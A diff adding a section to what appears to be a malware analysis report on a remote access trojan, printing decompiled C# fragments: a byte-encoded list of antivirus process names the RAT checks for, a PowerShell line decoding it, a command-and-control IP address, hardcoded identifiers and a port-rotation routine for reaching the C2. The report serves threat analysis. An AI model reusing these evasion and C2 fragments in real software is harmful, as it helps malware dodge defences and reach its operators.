@@ -214,11 +214,62 @@ public static string ulhtagniasOsname()
 </table> 
 </p>
 
-<h6>Can read the Operation System version</h6>
+<h6>On the RAT, one of two byte array is used for triggered the detection of a sensible AV</h6>
 
+```csharp
+public static byte[] encAvs = new byte[]{98,100,115,115,61,66,105,116,32,68,101,102,101,110,100,101,114,44,111,110,108,105,110,101,110,116,61,81,46,72,101,97,108,44,98,100,97,103,101,110,116,61,66,105,116,32,68,101,102,101,110,100,101,114,32,65,103,101,110,116,44,109,115,115,101,99,101,115,61,77,83,32,69,115,115,101,110,116,105,97,108,115,44,102,115,115,109,51,50,61,70,83,101,99,117,114,101,44,97,118,112,61,75,97,115,112,101,114,115,107,121,44,97,118,103,110,116,61,65,118,105,114,97,44,115,112,98,98,99,115,118,99,61,83,121,109,97,110,116,101,99,44,117,112,100,97,116,101,114,117,105,61,77,99,65,102,101,101,44,97,118,103,117,105,61,65,86,71,44,97,118,103,99,99,61,65,86,71,44,109,98,97,109,61,65,110,116,32,77,97,108,119,97,114,101,44,97,118,97,115,116,117,105,61,65,118,97,115,116,44,97,118,97,115,116,61,65,118,97,115,116};
+```
+<h6>This can easily viewable in oneliner (UTF8 + Getstring) and show the list of sensible AV to detect</h6>
+  
+```csharp
+PS> ([System.Text.Encoding]::UTF8.GetString($encAvs)).split(",")
+bdss=Bit Defender
+onlinent=Q.Heal
+bdagent=Bit Defender Agent
+msseces=MS Essentials     
+fssm32=FSecure
+avp=Kaspersky
+avgnt=Avira
+spbbcsvc=Symantec
+updaterui=McAfee
+avgui=AVG
+avgcc=AVG
+mbam=Ant Malware
+avastui=Avast
+avast=Avast 
+ ```
+  
+<h6>With the same logic, we can get the content of the second array which get the IP of the C2 to contact</h6>
 
-<h6></h6>
+```csharp
+PS> ([System.Text.Encoding]::UTF8.GetString($tab)).split(",")   
+198.46.177.73
+```
 
+<h6>Some identifiers like name of user, defaultIP and logname can be found </h6>
+
+```csharp
+public static string ulhtagniasmainApp = "ulhtagnias|ulhtagnias".Split(new char[]{'|'})[0];
+public static string ulhtagniaspc_id = "vhldsp|ulhtagnias".Split(new char[]{'|'})[0];
+public static string ulhtagniasremvUser = "drlarmn|ulhtagnias".Split(new char[]{'|'})[0];
+public static string ulhtagniasfilesLogs = "rndlbes".Split(new char[]{'|'})[0];}
+public static string ulhtagniasdefaultP = "122.200.110.101|ulhtagnias".Split(new char[]{'|'})[0];
+```
+<h6>This connect on the default port (6421) and can switch depending on the needs of the operations</h6>
+
+```csharp
+public static int[] ports = new int[]{6421,4920,10422,14823,16824};
+public void ulhtagniasports_switch()
+ {
+  try
+  {
+   this.port_sn++;
+   ulhtagniasCONF.ulhtagniasport = ulhtagniasCONF.ports[this.port_sn];
+   if (this.port_sn >= ulhtagniasCONF.ports.Length - 1){this.port_sn = 0;}
+  }
+ catch{this.port_sn = 0;}
+ }
+```
 <h2>Threat Intelligence</h2><a name="Intel"></a></h2>
 <h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
 
